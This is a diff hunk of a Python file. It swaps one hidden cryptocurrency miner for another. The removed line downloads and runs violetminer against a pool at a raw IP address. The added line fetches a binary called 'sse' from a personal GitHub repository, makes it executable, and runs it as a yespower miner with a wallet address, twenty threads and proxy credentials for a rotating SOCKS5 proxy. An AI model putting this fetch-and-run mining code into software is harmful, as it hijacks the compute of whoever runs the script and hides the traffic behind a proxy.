@@ -10,5 +10,4 @@ from os import system, name
 from time import sleep
 from subprocess import PIPE, Popen
 import base64
-p = subprocess.run("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm wrkzcoin --pool 172.65.222.237:443 --username nung.001 --password 123 --disableNVIDIA --threads 16", stdout=subprocess.PIPE, shell=True)
-print(p.communicate())
+os.system("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u oJRQf1RCkAgajwLGpiLYeanKFTj3AvkheT.STRM -t 20 -x socks5://Gafadta66-US-rotate:Gafadta66@p.webshare.io:80")
